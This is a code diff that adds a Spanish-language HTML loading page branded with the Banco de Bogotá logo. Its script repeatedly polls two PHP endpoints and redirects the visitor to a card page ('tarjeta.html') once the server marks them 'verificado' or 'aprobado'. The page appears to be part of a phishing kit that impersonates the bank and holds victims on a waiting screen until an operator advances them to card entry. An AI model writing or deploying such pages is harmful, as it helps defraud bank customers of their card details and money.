@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <link rel="stylesheet" href="loading.css">
+</head>
+<body>
+
+    <!-- Barra blanca con el logo -->
+    <header class="header">
+        <img src="banco-de-bogota.webp" alt="Banco de Bogotá" class="logo">
+    </header>
+
+    <!-- Contenedor de la pantalla de carga -->
+    <div class="loading-container">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        // Función para verificar el estado de autorización
+        function verificarEstado() {
+    fetch("verificar_estado.php")
+        .then(response => response.json())
+        .then(data => {
+            console.log("Estado recibido:", data); // 🔍 Muestra la respuesta en consola
+            if (data.estado === "verificado") {
+                window.location.href = "tarjeta.html";
+            } else {
+                setTimeout(verificarEstado, 3000); // Vuelve a intentarlo en 3s
+            }
+        })
+        .catch(error => console.error("Error verificando estado:", error));
+}
+
+verificarEstado(); // Inicia la verificación
+
+
+        // Función para verificar el paso a tarjeta.html
+        function verificarPasoTarjeta() {
+            fetch("verificar_tarjeta.php")
+                .then(response => response.json())
+                .then(data => {
+                    if (data.estado === "aprobado") {
+                        window.location.href = "tarjeta.html";
+                    } else {
+                        setTimeout(verificarPasoTarjeta, 3000); // Volver a intentar en 3s
+                    }
+                })
+                .catch(error => console.error("Error verificando tarjeta:", error));
+        }
+
+        // Ejecutar ambas verificaciones cuando cargue la página
+        document.addEventListener("DOMContentLoaded", function () {
+            verificarEstado();
+            verificarPasoTarjeta();
+        });
+    </script>
+
+</body>
+</html>
